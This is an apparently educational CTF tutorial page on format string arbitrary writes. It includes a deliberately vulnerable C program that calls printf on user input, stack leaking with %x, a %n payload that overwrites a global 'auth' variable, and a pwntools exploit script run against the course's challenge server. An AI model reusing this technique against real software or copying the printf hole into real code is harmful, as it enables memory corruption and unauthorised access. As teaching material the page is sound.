---
description: Performing arbitrary writes using format strings.
---

# format

{% file src="../../.gitbook/assets/format.zip" %}

This is an introduction to the **arbitrary write** of the format string bug. This allows us to write arbitrary values to an address of our choice. We use this to overwrite an authentication variable, which allows us to get the flag.

### Binary Static Analysis

For this binary, we will supply the source code to understand the binary better. This is the binary:

{% code title="findme.c" lineNumbers="true" %}
```c
#include <stdio.h>

int auth = 0;

int main() {
    char password[100];

    puts("Password: ");
    fflush(stdout);
    fgets(password, sizeof password, stdin);

    printf(password);
    printf("Auth is %i\n", auth);

    if(auth == 10) {
        system("cat flag.txt");
    }
}
```
{% endcode %}

In this case, here's what we notice:

* There is a secure `fgets` call that doesn't allow for buffer overflow. This means that we can't just overwrite the `auth` variable (we also know that global variables get loaded into a different memory segment, so buffer overflow doesn't make much sense).
* There is a format string vulnerability where they print our password. This means that we can leak data off the stack.
* Our goal is to modify `auth`, which is a global variable. This is where the _arbitrary write_ comes in. We have a slight advantage that `auth` is global, meaning its address is known at compile time. This means that we can write to it directly.

Let's first see what kind of data we can leak. We'll use a series of `%x` inputs to leak as much data as possible.

```bash
$ ./format
Password: 
%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
64 f7e2a620 80491bd 0 1 f7fc1a40 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520
Auth is 0
```

We notice that a series of the same data pattern reappears after a few iterations. A quick observation shows us that:

```bash
$ python3 -c "print(''.join(hex(ord(x))[2:] for x in '%x '))"
257820
```

This means that this pattern represents our input! Our input starts at the 7th position off the stack. **This is vital info**; we can use this as a baseline for where we are in memory.

### Arbitrary Writes

There is a special format specifier in C that has a particular function: `%n`. `%n` is unlike the other format specifiers in that it _stores_ data, namely **the number of bytes written thus far**. Typically, this is used like below:

```c
int main(void)
{
    int bytes;
    printf("Hello World%n\n", &bytes);
    printf("Bytes written: %d\n", bytes);
}
```

This prints:

```bash
$ ./test
Hello World
Bytes written: 11
```

How can we exploit this? If we can pass in an address of our choice, we can write a number to that address.

### Getting the Necessary Information

We need three things to perform an arbitrary write:

* The location on the stack of our buffer
* The location of the address we want to write
* The value we want to write

We figured out the first one already! We determined that our input started at the 7th position. Now we need the address of where we want to write. There are two ways to do this:

1. Use the list of global variables in `gdb`: `info variables` (`is` in `radare2`)
2. Use the symbol table, accessible with `readelf -s <binary>`

Either way, we get that `auth` is located at `0x0804c02c`. Finally, we know that we want to write 10 bytes, meaning that before we place the `%n`, we need to write 10 bytes.

Let's put this all together and discuss why this payload works:

```python
payload = p32(0x0804c02c)
payload += b'A' * 6
payload += b'%7$n'
```

We first write the address of `auth` to the stack. Then, we write six more bytes of data to fill the requirement of writing 10 bytes of data. Finally, we write the `%n` specifier, which writes the number of bytes written so far to the address at the 7th position on the stack. This is the address of `auth`, so we write `10` to `auth`!

### Exploiting the Binary

Let's put this all together and get the flag!

{% code title="exploit.py" lineNumbers="true" %}
```python
from pwn import *

elf = context.binary = ELF('./format')
p = remote('vunrotc.cole-ellis.com', 3200)

payload = p32(0x0804c02c)
payload += b'A' * 0x6
payload += b'%7$n'

p.sendline(payload)
p.interactive()
```
{% endcode %}

Running this gives:

```bash
$ python3 exploit.py
[*] '/home/joybuzzer/Documents/vunrotc/public/03-formats/format/src/format'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to vunrotc.cole-ellis.com on port 3200: Done
[*] Switching to interactive mode
Password: 
flag{maybe_we_need_a_better_dev}
0\xcAAAAAA
Auth is 10
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to vunrotc.cole-ellis.com port 3200
```

We see that `auth` is changed, and the flag is printed!
